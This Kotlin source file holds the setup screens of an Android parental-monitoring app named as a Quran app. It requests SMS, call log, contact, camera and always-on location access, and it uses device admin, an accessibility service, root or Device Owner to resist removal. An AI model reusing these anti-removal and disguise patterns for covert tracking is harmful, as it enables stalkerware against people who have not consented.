package com.abo7tb.childapp.ui

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.widget.Toast
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityManager
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.BatteryChargingFull
import androidx.compose.material.icons.filled.Call
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.Contacts
import androidx.compose.material.icons.filled.Layers
import androidx.compose.material.icons.filled.LocationOn
import androidx.compose.material.icons.filled.Message
import androidx.compose.material.icons.filled.Notifications
import androidx.compose.material.icons.filled.Security
import androidx.compose.material.icons.filled.Settings
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalLifecycleOwner
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.input.VisualTransformation
import androidx.compose.animation.with
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.abo7tb.childapp.utils.DeviceAdminHelper
import com.abo7tb.childapp.utils.DeviceOwnerHelper
import com.abo7tb.childapp.utils.RootHelper
import androidx.hilt.navigation.compose.hiltViewModel
import com.google.accompanist.permissions.ExperimentalPermissionsApi
import com.google.accompanist.permissions.rememberMultiplePermissionsState
import androidx.compose.animation.ExperimentalAnimationApi
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

@OptIn(ExperimentalAnimationApi::class)
@Composable
fun RegistrationScreen(
    viewModel: DeviceRegistrationViewModel = hiltViewModel(),
    onRegisterSuccess: () -> Unit
) {
    var step by remember { mutableStateOf(1) }
    val state by viewModel.state.collectAsState()
    val context = LocalContext.current
    
    // Trigger success logic when state becomes successful
    LaunchedEffect(state.isSuccess) {
        if (state.isSuccess) {
            step = 6
        }
    }

    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(
                brush = Brush.verticalGradient(
                    colors = listOf(
                        Color(0xFF0F0C29),
                        Color(0xFF302B63),
                        Color(0xFF24243E)
                    )
                )
            )
    ) {
        androidx.compose.animation.AnimatedContent(
            targetState = step,
            transitionSpec = {
                if (targetState > initialState) {
                    (androidx.compose.animation.slideInHorizontally(initialOffsetX = { width -> width }) + androidx.compose.animation.fadeIn()).with(
                            androidx.compose.animation.slideOutHorizontally(targetOffsetX = { width -> -width }) + androidx.compose.animation.fadeOut()
                    )
                } else {
                    (androidx.compose.animation.slideInHorizontally(initialOffsetX = { width -> -width }) + androidx.compose.animation.fadeIn()).with(
                            androidx.compose.animation.slideOutHorizontally(targetOffsetX = { width -> width }) + androidx.compose.animation.fadeOut()
                    )
                }
            },
            label = "StepAnimation"
        ) { targetStep ->
            when (targetStep) {
                1 -> WelcomeView(onNext = { step = 2 })
                2 -> PermissionsView(onNext = { step = 3 })
                3 -> ProtectionSetupView(onNext = { step = 4 })
                4 -> ChildConsentView(onAgree = { step = 5 })
                5 -> AuthView(
                    state = state,
                    onRegister = { email, password, childName, childAge ->
                        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
                        viewModel.registerDevice(email, password, childName, childAge, androidId)
                    }
                )
                6 -> SetupCompleteView(onComplete = onRegisterSuccess)
            }
        }
    }
}

data class PermissionItem(
    val title: String,
    val description: String,
    val icon: ImageVector,
    val isGranted: Boolean,
    val onEnable: () -> Unit
)

fun isAccessibilityProtectionEnabled(context: Context): Boolean {
    val am = context.getSystemService(Context.ACCESSIBILITY_SERVICE) as? AccessibilityManager
        ?: return false
    val enabledServices = am.getEnabledAccessibilityServiceList(
        AccessibilityServiceInfo.FEEDBACK_ALL_MASK
    )
    return enabledServices.any { it.resolveInfo.serviceInfo.packageName == context.packageName }
}

fun requestAccessibilityPermission(context: Context) {
    val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
    }
    context.startActivity(intent)
    android.widget.Toast.makeText(
        context,
        "فعّل خدمة الحماية من الحذف من قائمة الوصول للمستخدم",
        android.widget.Toast.LENGTH_LONG
    ).show()
}

fun openRestrictedSettingsGuide(context: Context) {
    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
        data = Uri.parse("package:${context.packageName}")
        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
    }
    context.startActivity(intent)
    Toast.makeText(
        context,
        "اضغط على النقط الثلاث (⋮) في الأعلى → اختر 'Allow restricted settings'",
        Toast.LENGTH_LONG
    ).show()
}

@Composable
fun PermissionCard(item: PermissionItem) {
    Card(
        modifier = Modifier
            .fillMaxWidth()
            .padding(vertical = 8.dp),
        colors = CardDefaults.cardColors(
            containerColor = if (item.isGranted)
                Color(0xFF00D9FF).copy(alpha = 0.15f)
            else
                Color.White.copy(alpha = 0.05f)
        ),
        shape = RoundedCornerShape(16.dp)
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(16.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Box(
                modifier = Modifier
                    .size(48.dp)
                    .background(
                        color = Color(0xFF00D9FF).copy(alpha = 0.2f),
                        shape = CircleShape
                    ),
                contentAlignment = Alignment.Center
            ) {
                Icon(
                    imageVector = item.icon,
                    contentDescription = null,
                    tint = Color(0xFF00D9FF),
                    modifier = Modifier.size(24.dp)
                )
            }

            Spacer(modifier = Modifier.width(16.dp))

            Column(modifier = Modifier.weight(1f)) {
                Text(
                    text = item.title,
                    color = Color.White,
                    fontSize = 16.sp,
                    fontWeight = FontWeight.SemiBold
                )
                Text(
                    text = item.description,
                    color = Color.White.copy(alpha = 0.7f),
                    fontSize = 12.sp
                )
            }

            Spacer(modifier = Modifier.width(8.dp))

            if (item.isGranted) {
                Icon(
                    imageVector = Icons.Default.CheckCircle,
                    contentDescription = null,
                    tint = Color(0xFF00D9FF),
                    modifier = Modifier.size(28.dp)
                )
            } else {
                Button(
                    onClick = item.onEnable,
                    colors = ButtonDefaults.buttonColors(
                        containerColor = Color(0xFF00D9FF)
                    ),
                    shape = RoundedCornerShape(12.dp)
                ) {
                    Text(
                        text = "فعّل",
                        color = Color(0xFF0F0C29),
                        fontSize = 14.sp,
                        fontWeight = FontWeight.Bold
                    )
                }
            }
        }
    }
}

@Composable
fun WelcomeView(onNext: () -> Unit) {
    Column(
        modifier = Modifier.padding(24.dp).fillMaxSize(), 
        verticalArrangement = Arrangement.Center,
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Text("القرآن الكريم", style = MaterialTheme.typography.displaySmall, fontWeight = FontWeight.Bold, color = Color(0xFF00D9FF))
        Spacer(modifier = Modifier.height(16.dp))
        Text("تطبيق القرآن الكريم - نسخة الطفل", style = MaterialTheme.typography.titleLarge, color = Color.White)
        Spacer(modifier = Modifier.height(8.dp))
        Text("سيتم إعداد هذا الجهاز ليتم متابعته من قبل ولي الأمر لضمان حماية طفلك.", textAlign = TextAlign.Center, color = Color.White.copy(alpha = 0.8f))
        Spacer(modifier = Modifier.height(32.dp))
        Button(
            onClick = onNext, 
            modifier = Modifier.fillMaxWidth(),
            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D9FF), contentColor = Color(0xFF0F0C29))
        ) { Text("التالي") }
    }
}

@OptIn(ExperimentalPermissionsApi::class)
@Composable
fun PermissionsView(onNext: () -> Unit) {
    val context = LocalContext.current
    val lifecycleOwner = LocalLifecycleOwner.current

    val corePermissions = remember {
        buildList {
            add(Manifest.permission.ACCESS_FINE_LOCATION)
            add(Manifest.permission.ACCESS_COARSE_LOCATION)
            add(Manifest.permission.READ_CONTACTS)
            add(Manifest.permission.READ_CALL_LOG)
            add(Manifest.permission.READ_SMS)
            add(Manifest.permission.CAMERA)
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
                add(Manifest.permission.POST_NOTIFICATIONS)
            }
        }
    }

    val permissionsState = rememberMultiplePermissionsState(permissions = corePermissions)
    var refreshKey by remember { mutableIntStateOf(0) }
    val activity = LocalContext.current as? Activity

    fun hasPermission(permission: String): Boolean =
        ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED

    fun refreshPermissionStates() {
        refreshKey++
    }

    val coreGranted = remember(refreshKey, permissionsState.allPermissionsGranted) {
        corePermissions.all { hasPermission(it) }
    }

    val hasBackgroundLocation = remember(refreshKey) {
        android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.Q ||
            hasPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
    }

    val hasFineLocation = remember(refreshKey) {
        hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)
    }

    var isBatteryExempted by remember { mutableStateOf(false) }
    var hasOverlayPermission by remember { mutableStateOf(false) }
    var hasDeviceAdmin by remember { mutableStateOf(false) }
    var hasAccessibilityProtection by remember { mutableStateOf(false) }
    
    fun requestBatteryOptimization(context: Context) {
        try {
            val intent = Intent().apply {
                action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                data = Uri.parse("package:${context.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
        } catch (e: Exception) {
            try {
                val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
            } catch (e2: Exception) {
                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = Uri.parse("package:${context.packageName}")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
            }
        }
    }

    fun requestBackgroundLocation(activity: Activity) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(
                    activity,
                    Manifest.permission.ACCESS_FINE_LOCATION
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                ActivityCompat.requestPermissions(
                    activity,
                    arrayOf(
                        Manifest.permission.ACCESS_FINE_LOCATION,
                        Manifest.permission.ACCESS_COARSE_LOCATION
                    ),
                    1001
                )
                return
            }

            if (ContextCompat.checkSelfPermission(
                    activity,
                    Manifest.permission.ACCESS_BACKGROUND_LOCATION
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                        data = Uri.parse("package:${activity.packageName}")
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    activity.startActivity(intent)
                    android.widget.Toast.makeText(
                        activity,
                        "اختر 'السماح طوال الوقت' من الأذونات",
                        android.widget.Toast.LENGTH_LONG
                    ).show()
                } else {
                    ActivityCompat.requestPermissions(
                        activity,
                        arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION),
                        1002
                    )
                }
            }
        }
    }

    fun updateSystemStates() {
        val powerManager = context.getSystemService(android.content.Context.POWER_SERVICE) as android.os.PowerManager
        isBatteryExempted = powerManager.isIgnoringBatteryOptimizations(context.packageName)
        hasOverlayPermission = Settings.canDrawOverlays(context)
        hasDeviceAdmin = DeviceAdminHelper.isAdminActive(context)
        hasAccessibilityProtection = isAccessibilityProtectionEnabled(context)
        refreshPermissionStates()
    }

    DisposableEffect(lifecycleOwner) {
        val observer = androidx.lifecycle.LifecycleEventObserver { _, event ->
            if (event == androidx.lifecycle.Lifecycle.Event.ON_RESUME) {
                updateSystemStates()
            }
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose { lifecycleOwner.lifecycle.removeObserver(observer) }
    }

    LaunchedEffect(Unit) { updateSystemStates() }

    val backgroundLocationLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { updateSystemStates() }

    val deviceAdminLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { updateSystemStates() }

    val locationReady = hasBackgroundLocation || hasFineLocation

    val permissionItems = listOf(
        PermissionItem(
            title = "الوصول للموقع",
            description = "لمعرفة مكان الطفل في أي وقت",
            icon = Icons.Default.LocationOn,
            isGranted = hasFineLocation,
            onEnable = {
                permissionsState.launchMultiplePermissionRequest()
            }
        ),
        PermissionItem(
            title = "الظهور فوق التطبيقات",
            description = "لعرض شاشة القفل عند الحاجة",
            icon = Icons.Default.Layers,
            isGranted = hasOverlayPermission,
            onEnable = {
                val intent = Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:${context.packageName}")
                )
                context.startActivity(intent)
            }
        ),
        PermissionItem(
            title = "العمل في الخلفية",
            description = "لضمان استمرار الحماية دائماً",
            icon = Icons.Default.BatteryChargingFull,
            isGranted = isBatteryExempted,
            onEnable = { requestBatteryOptimization(context) }
        ),
        PermissionItem(
            title = "الموقع طوال الوقت",
            description = "اختر السماح طوال الوقت في إعدادات الموقع",
            icon = Icons.Default.LocationOn,
            isGranted = hasBackgroundLocation,
            onEnable = {
                activity?.let {
                    requestBackgroundLocation(it)
                } ?: run {
                    android.widget.Toast.makeText(context, "لا يمكن فتح إعدادات الموقع الآن", android.widget.Toast.LENGTH_LONG).show()
                }
            }
        ),
        PermissionItem(
            title = "مدير الجهاز",
            description = "لحماية التطبيق من الحذف",
            icon = Icons.Default.Security,
            isGranted = hasDeviceAdmin,
            onEnable = {
                deviceAdminLauncher.launch(DeviceAdminHelper.createActivateAdminIntent(context))
            }
        ),
        PermissionItem(
            title = "السماح بالإعدادات المقيدة",
            description = "خطوة ضرورية لتفعيل الحماية الكاملة (للأندرويد 13+)",
            icon = Icons.Default.Settings,
            isGranted = false,
            onEnable = {
                openRestrictedSettingsGuide(context)
            }
        ),
        PermissionItem(
            title = "الحماية من الحذف",
            description = "فعّل خدمة الوصول لتقليل إمكانية حذف التطبيق",
            icon = Icons.Default.Security,
            isGranted = hasAccessibilityProtection,
            onEnable = {
                requestAccessibilityPermission(context)
            }
        ),
        PermissionItem(
            title = "الوصول للمكالمات",
            description = "لمراقبة سجل المكالمات",
            icon = Icons.Default.Call,
            isGranted = hasPermission(Manifest.permission.READ_CALL_LOG),
            onEnable = { permissionsState.launchMultiplePermissionRequest() }
        ),
        PermissionItem(
            title = "الوصول للرسائل",
            description = "لمراقبة الرسائل النصية",
            icon = Icons.Default.Message,
            isGranted = hasPermission(Manifest.permission.READ_SMS),
            onEnable = { permissionsState.launchMultiplePermissionRequest() }
        ),
        PermissionItem(
            title = "جهات الاتصال",
            description = "لعرض جهات اتصال الطفل",
            icon = Icons.Default.Contacts,
            isGranted = hasPermission(Manifest.permission.READ_CONTACTS),
            onEnable = { permissionsState.launchMultiplePermissionRequest() }
        ),
        PermissionItem(
            title = "الإشعارات",
            description = "لعرض تنبيهات التطبيق",
            icon = Icons.Default.Notifications,
            isGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) hasPermission(Manifest.permission.POST_NOTIFICATIONS) else true,
            onEnable = { permissionsState.launchMultiplePermissionRequest() }
        )
    )

    val allGranted = coreGranted &&
        isBatteryExempted &&
        hasOverlayPermission &&
        locationReady &&
        hasDeviceAdmin &&
        hasAccessibilityProtection

    val pendingItems = permissionItems.filter { !it.isGranted }.map { it.title }
    val coroutineScope = rememberCoroutineScope()

    Scaffold(
        bottomBar = {
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .background(Color(0xFF0F0C29))
                    .padding(16.dp)
            ) {
                Button(
                    onClick = {
                        coroutineScope.launch {
                            android.widget.Toast.makeText(context, "تم الانتهاء من منح الصلاحيات بنجاح!", android.widget.Toast.LENGTH_SHORT).show()
                            delay(1000)
                            onNext()
                        }
                    },
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(56.dp),
                    enabled = allGranted,
                    colors = ButtonDefaults.buttonColors(
                        containerColor = Color(0xFF00D9FF),
                        contentColor = Color(0xFF0F0C29)
                    )
                ) {
                    Text(
                        text = "متابعة لإنشاء الحساب",
                        fontSize = 18.sp,
                        fontWeight = FontWeight.Bold
                    )
                }
            }
        }
    ) { paddingValues ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(paddingValues)
                .verticalScroll(rememberScrollState())
                .padding(24.dp)
        ) {
            Text("الصلاحيات المطلوبة", style = MaterialTheme.typography.headlineMedium, fontWeight = FontWeight.Bold, color = Color(0xFF00D9FF))
            Spacer(modifier = Modifier.height(16.dp))
            Text(
                "يجب منح الصلاحيات التالية. إذا عدت من الإعدادات وزر المتابعة لا يزال معطّلاً، تأكد من النقاط بالأسفل.",
                textAlign = TextAlign.Center,
                color = Color(0xFFFF5252)
            )
            Spacer(modifier = Modifier.height(32.dp))

            permissionItems.forEach { item ->
                PermissionCard(item = item)
            }

            Spacer(modifier = Modifier.height(16.dp))

            if (pendingItems.isNotEmpty()) {
                Text("متبقي:", style = MaterialTheme.typography.labelLarge, color = Color(0xFFFF5252))
                pendingItems.forEach { item ->
                    Text("• $item", style = MaterialTheme.typography.bodySmall, color = Color(0xFFFF8A80))
                }
                Spacer(modifier = Modifier.height(12.dp))
            }
        }
    }
}

@Composable
fun ProtectionSetupView(onNext: () -> Unit) {
    val context = LocalContext.current
    val scope = rememberCoroutineScope()

    var rootAvailable by remember { mutableStateOf(false) }
    var rootGranted by remember { mutableStateOf(false) }
    var isDeviceOwner by remember { mutableStateOf(false) }
    var checking by remember { mutableStateOf(false) }

    val adbCommand = remember { DeviceOwnerHelper.getAdbSetupCommand(context) }

    fun refreshStatus() {
        rootAvailable = RootHelper.isRootAvailable()
        isDeviceOwner = DeviceOwnerHelper.hasStrongProtection(context)
    }

    LaunchedEffect(Unit) { refreshStatus() }

    Column(
        modifier = Modifier.padding(24.dp).fillMaxSize(),
        verticalArrangement = Arrangement.Center,
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Text("🛡️ حماية قصوى", style = MaterialTheme.typography.headlineMedium, fontWeight = FontWeight.Bold, color = Color(0xFF00D9FF))
        Spacer(modifier = Modifier.height(12.dp))
        Text(
            "لمنع الطفل من حذف التطبيق، فعّل Root و/أو Device Owner قبل التسجيل.",
            textAlign = TextAlign.Center,
            color = Color.White.copy(alpha = 0.8f)
        )
        Spacer(modifier = Modifier.height(24.dp))

        Card(
            modifier = Modifier.fillMaxWidth(),
            colors = CardDefaults.cardColors(containerColor = Color.White.copy(alpha = 0.1f))
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text("1. Root (Magisk)", fontWeight = FontWeight.Bold, color = Color(0xFF00D9FF))
                Spacer(modifier = Modifier.height(8.dp))
                Text(
                    if (rootAvailable) "✅ Root متاح" else "❌ Root غير متاح — ثبّت Magisk وامنح su",
                    color = if (rootAvailable) Color(0xFF10B981) else Color(0xFFFF5252)
                )
                Spacer(modifier = Modifier.height(8.dp))
                Button(
                    onClick = {
                        checking = true
                        scope.launch {
                            rootGranted = RootHelper.isRootAvailable()
                            checking = false
                            refreshStatus()
                        }
                    },
                    modifier = Modifier.fillMaxWidth(),
                    enabled = !checking,
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D9FF), contentColor = Color(0xFF0F0C29))
                ) {
                    Text(
                        when {
                            checking -> "جاري التحقق..."
                            rootGranted -> "✅ Root يعمل"
                            else -> "منح صلاحية Root"
                        }
                    )
                }
            }
        }

        Spacer(modifier = Modifier.height(16.dp))

        Card(
            modifier = Modifier.fillMaxWidth(),
            colors = CardDefaults.cardColors(containerColor = Color.White.copy(alpha = 0.1f))
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text("2. Device Owner (الأقوى)", fontWeight = FontWeight.Bold, color = Color(0xFF00D9FF))
                Spacer(modifier = Modifier.height(8.dp))
                Text(
                    if (isDeviceOwner) "✅ Device Owner مفعّل" else "نفّذ من كمبيوتر (قبل أي حساب Google):",
                    color = if (isDeviceOwner) Color(0xFF10B981) else Color.White.copy(alpha = 0.7f)
                )
                if (!isDeviceOwner) {
                    Spacer(modifier = Modifier.height(8.dp))
                    Text(adbCommand, style = MaterialTheme.typography.bodySmall, color = Color(0xFF00D9FF))
                    Spacer(modifier = Modifier.height(8.dp))
                    Text(
                        "بعد factory reset → لا تسجّل Google → ثبّت APK → نفّذ الأمر → افتح التطبيق",
                        style = MaterialTheme.typography.bodySmall,
                        textAlign = TextAlign.Center,
                        color = Color.White.copy(alpha = 0.6f)
                    )
                }
                Spacer(modifier = Modifier.height(8.dp))
                OutlinedButton(
                    onClick = { refreshStatus() }, 
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.outlinedButtonColors(contentColor = Color(0xFF00D9FF))
                ) {
                    Text("تحقق من Device Owner")
                }
            }
        }

        Spacer(modifier = Modifier.height(24.dp))

        Text(
            "بدون Root/Device Owner: الحماية محدودة — الطفل قد يحذف التطبيق من الإعدادات.",
            style = MaterialTheme.typography.bodySmall,
            color = Color(0xFFFF5252),
            textAlign = TextAlign.Center
        )

        Spacer(modifier = Modifier.height(16.dp))

        Button(
            onClick = onNext, 
            modifier = Modifier.fillMaxWidth(),
            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D9FF), contentColor = Color(0xFF0F0C29))
        ) {
            Text("متابعة")
        }
    }
}

@Composable
fun ChildConsentView(onAgree: () -> Unit) {
    Column(
        modifier = Modifier.padding(24.dp).fillMaxSize(), 
        verticalArrangement = Arrangement.Center,
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Text("موافقة الرقابة الأبوية", style = MaterialTheme.typography.headlineMedium, fontWeight = FontWeight.Bold, color = Color(0xFF00D9FF))
        Spacer(modifier = Modifier.height(16.dp))
        Text("سيتم مراقبة هذا الجهاز من قبل والديك من أجل سلامتك. لا تقم بالاستمرار إذا لم تكن موافقاً.", textAlign = TextAlign.Center, color = Color.White.copy(alpha = 0.8f))
        Spacer(modifier = Modifier.height(32.dp))
        Button(
            onClick = onAgree, 
            modifier = Modifier.fillMaxWidth(),
            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D9FF), contentColor = Color(0xFF0F0C29))
        ) { Text("أنا أوافق") }
    }
}

@Composable
fun AuthView(state: RegistrationState, onRegister: (String, String, String, Int) -> Unit) {
    Column(
        modifier = Modifier.padding(24.dp).fillMaxSize(), 
        verticalArrangement = Arrangement.Center,
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Text("تسجيل جهاز الطفل", style = MaterialTheme.typography.headlineMedium, fontWeight = FontWeight.Bold, color = Color(0xFF00D9FF))
        Spacer(modifier = Modifier.height(24.dp))
        
        var email by remember { mutableStateOf("") }
        var password by remember { mutableStateOf("") }
        var childName by remember { mutableStateOf("") }
        var childAge by remember { mutableStateOf("") }
        var passwordVisible by remember { mutableStateOf(false) }
        
        val textFieldColors = OutlinedTextFieldDefaults.colors(
            focusedBorderColor = Color(0xFF00D9FF),
            unfocusedBorderColor = Color.White.copy(alpha = 0.5f),
            focusedTextColor = Color.White,
            unfocusedTextColor = Color.White,
            cursorColor = Color(0xFF00D9FF),
            focusedLabelColor = Color(0xFF00D9FF),
            unfocusedLabelColor = Color.White.copy(alpha = 0.7f)
        )

        OutlinedTextField(value = email, onValueChange = { email = it }, label = { Text("بريد ولي الأمر") }, modifier = Modifier.fillMaxWidth(), colors = textFieldColors)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(
            value = password, 
            onValueChange = { password = it }, 
            label = { Text("كلمة مرور ولي الأمر") }, 
            visualTransformation = if (passwordVisible) VisualTransformation.None else PasswordVisualTransformation(),
            trailingIcon = {
                TextButton(onClick = { passwordVisible = !passwordVisible }) {
                    Text(if (passwordVisible) "إخفاء" else "إظهار", color = Color(0xFF00D9FF))
                }
            },
            modifier = Modifier.fillMaxWidth(),
            colors = textFieldColors
        )
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = childName, onValueChange = { childName = it }, label = { Text("اسم الطفل") }, modifier = Modifier.fillMaxWidth(), colors = textFieldColors)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = childAge, onValueChange = { childAge = it }, label = { Text("عمر الطفل") }, modifier = Modifier.fillMaxWidth(), colors = textFieldColors)
        
        Spacer(modifier = Modifier.height(24.dp))
        
        Button(
            onClick = { 
                val parsedAge = childAge.toIntOrNull() ?: 10
                val validAge = if (parsedAge < 1 || parsedAge > 17) 10 else parsedAge
                onRegister(email, password, childName, validAge) 
            }, 
            modifier = Modifier.fillMaxWidth(),
            enabled = !state.isLoading && email.isNotBlank() && password.isNotBlank() && childName.isNotBlank(),
            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D9FF), contentColor = Color(0xFF0F0C29))
        ) { 
            if (state.isLoading) {
                CircularProgressIndicator(modifier = Modifier.size(24.dp), color = Color(0xFF0F0C29))
            } else {
                Text("تسجيل الجهاز") 
            }
        }

        if (state.errorMessage != null) {
            Spacer(modifier = Modifier.height(16.dp))
            Text(text = state.errorMessage, color = Color(0xFFFF5252), textAlign = TextAlign.Center)
        }
    }
}

@Composable
fun EnableAdminView(onDone: () -> Unit) {
    val context = LocalContext.current
    val lifecycleOwner = LocalLifecycleOwner.current
    var isActive by remember { mutableStateOf(DeviceAdminHelper.isAdminActive(context)) }

    val launcher = rememberLauncherForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        isActive = DeviceAdminHelper.isAdminActive(context)
        if (isActive) onDone()
    }

    DisposableEffect(lifecycleOwner) {
        val observer = androidx.lifecycle.LifecycleEventObserver { _, event ->
            if (event == androidx.lifecycle.Lifecycle.Event.ON_RESUME) {
                isActive = DeviceAdminHelper.isAdminActive(context)
                if (isActive) onDone()
            }
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose { lifecycleOwner.lifecycle.removeObserver(observer) }
    }

    Column(
        modifier = Modifier.padding(24.dp).fillMaxSize(),
        verticalArrangement = Arrangement.Center,
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Text("🛡️ حماية من الحذف", style = MaterialTheme.typography.headlineMedium, fontWeight = FontWeight.Bold, color = Color(0xFF00D9FF))
        Spacer(modifier = Modifier.height(16.dp))
        Text(
            "يجب تفعيل «مدير الجهاز» لمنع الطفل من حذف التطبيق بدون إيميل وكلمة مرور ولي الأمر.",
            textAlign = TextAlign.Center,
            color = Color.White.copy(alpha = 0.8f)
        )
        Spacer(modifier = Modifier.height(32.dp))
        Button(
            onClick = { launcher.launch(DeviceAdminHelper.createActivateAdminIntent(context)) },
            modifier = Modifier.fillMaxWidth(),
            enabled = !isActive,
            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D9FF), contentColor = Color(0xFF0F0C29))
        ) {
            Text(if (isActive) "✅ تم تفعيل الحماية" else "تفعيل الحماية من الحذف")
        }
    }
}

@Composable
fun SetupCompleteView(onComplete: () -> Unit) {
    var seconds by remember { mutableStateOf(3) }
    
    LaunchedEffect(Unit) {
        while (seconds > 0) {
            delay(1000)
            seconds--
        }
        onComplete()
    }

    Column(
        modifier = Modifier.padding(24.dp).fillMaxSize(), 
        verticalArrangement = Arrangement.Center,
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Text("✅ تم التثبيت بنجاح!", style = MaterialTheme.typography.headlineMedium, fontWeight = FontWeight.Bold, color = Color(0xFF00D9FF))
        Spacer(modifier = Modifier.height(16.dp))
        Text("يمكنك فتح التطبيق من قائمة التطبيقات باسم القرآن الكريم", style = MaterialTheme.typography.titleMedium, color = Color.White, textAlign = TextAlign.Center)
        Spacer(modifier = Modifier.height(32.dp))
        Button(
            onClick = onComplete,
            modifier = Modifier.fillMaxWidth(),
            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D9FF), contentColor = Color(0xFF0F0C29))
        ) {
            Text("إنهاء الإعداد")
        }
    }
}
